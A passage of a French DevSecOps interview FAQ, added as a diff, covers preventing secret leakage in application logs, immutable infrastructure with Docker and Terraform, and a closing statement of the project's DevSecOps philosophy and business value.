+**Dans ce projet** : `actions/setup-java@v4` avec `cache: 'maven'` gère le cache Maven automatiquement. Le build CI backend passe de ~5 min à ~2 min grâce au cache des dépendances.
+
+---
+
+### Q298 — Comment évitez-vous la fuite de secrets dans les logs applicatifs ?
+
+Les logs sont un vecteur de fuite de secrets très courant — stack traces, requêtes SQL, headers HTTP loggés par accident.
+
+**Techniques appliquées dans ce projet** :
+
+1. **Masquage Logback** (pattern de log) :
+```xml
+<pattern>%d{ISO8601} [%thread] %-5level %logger{36} - %msg%n</pattern>
+<!-- Ne jamais logger : request body complet, headers Authorization, paramètres de connexion DB -->
+```
+
+2. **Exclusion des champs sensibles Jackson** :
+```java
+@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)
+private String password;  // jamais sérialisé en JSON (= jamais loggé dans les réponses)
+```
+
+3. **Variables d'environnement, jamais de valeurs dans les logs** :
+```java
+log.info("Connexion DB établie sur {}", datasourceUrl);  // OK
+log.info("Connexion DB: {} / {}", datasourceUrl, password);  // JAMAIS
+```
+
+4. **Gitleaks dans le CI** : scanne les commits pour détecter des patterns de secrets avant qu'ils atteignent le repo.
+```yaml
+- uses: gitleaks/gitleaks-action@v2
+  env:
+    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+```
+
+---
+
+### Q299 — Qu'est-ce que le principe de "Immutable Infrastructure" et comment ce projet s'y conforme-t-il ?
+
+**Infrastructure immuable** : une instance en production n'est jamais modifiée. Si une configuration change, on détruit l'ancienne instance et on en crée une nouvelle identique.
+
+**Bénéfices** :
+- Élimine les "snowflake servers" (serveurs uniques avec des modifications manuelles accumulées)
+- Déploiements reproductibles à 100% (pas de "ça marchait hier...")
+- Rollback = redéployer l'image précédente, pas "annuler la modification"
+
+**Dans ce projet** :
+
+| Composant | Immuable ? | Détails |
+|-----------|-----------|---------|
+| Images Docker | ✅ Oui | Tag SHA immuable (`sha-abc123`), jamais de `:latest` en prod |
+| EC2 | ⚠️ Partiel | L'instance est modifiée par `docker pull` au déploiement |
+| Infrastructure Terraform | ✅ Oui | `terraform apply` recrée si la config change |
+| `docker-compose.yml` | ⚠️ Modifiable | Idéalement rebuildé dans l'AMI |
+
+**Évolution cible** : Packer pour construire des AMIs avec Docker + configuration inclus → l'EC2 est entièrement immuable, `terraform taint` + `terraform apply` = nouvelle instance propre.
+
+---
+
+## Question finale
+
+### Q300 — En une phrase, quelle est votre philosophie du DevSecOps ?
+
+"Le DevSecOps, c'est faire en sorte qu'écrire du code sécurisé, testé et déployable soit le **chemin de moindre résistance** pour un développeur — pas une contrainte supplémentaire imposée après coup."
+
+Concrètement : si le pipeline CI fait échouer un build à cause d'une CVE critique en 2 minutes, avant que le développeur soit passé à autre chose, c'est une contrainte utile. Si un audit de sécurité bloque une release à J-1, c'est un dysfonctionnement organisationnel.
+
+Ce projet incarne cette philosophie :
+- Les tests, le SAST, le DAST, le scan de dépendances sont **automatiques** → zéro friction pour le développeur
+- Le déploiement est **automatique** → la prod est toujours synchrone avec `main`
+- La documentation est **dans le repo** → l'onboarding d'un nouveau développeur = `git clone` + lire les `docs/`
+
+La sécurité et la qualité ne sont pas des phases du cycle de développement — ce sont des propriétés continues du système.
+
+---
+
+"Ce projet démontre concrètement trois valeurs business que chaque DSI mesure :
+
+**1. Réduction du Time to Market** : 8 minutes du commit au déploiement en production. Sans CI/CD, ce délai peut être des jours voire des semaines. Sur 100 features dans l'année, c'est des mois gagnés.
+
+**2. Réduction du risque** : chaque ligne de code est analysée automatiquement (SAST, DAST, CVE). En 2023, une CVE critique non patchée a coûté en moyenne 4.35 millions de dollars à l'entreprise impactée. Ici, Dependabot enverrait une alerte et un patch en moins de 24h.
+
+**3. Réduction des coûts opérationnels** : l'infrastructure est décrite en code (Terraform). Créer un environnement identique pour l'équipe de test = 20 minutes. Sans IaC, c'est plusieurs jours de travail d'un administrateur système.
+
+Ce portfolio n'est pas un démonstrateur académique — il est en production, il répond à de vraies requêtes HTTP, et chaque technologie est mesurable et auditable dans le code et les logs."
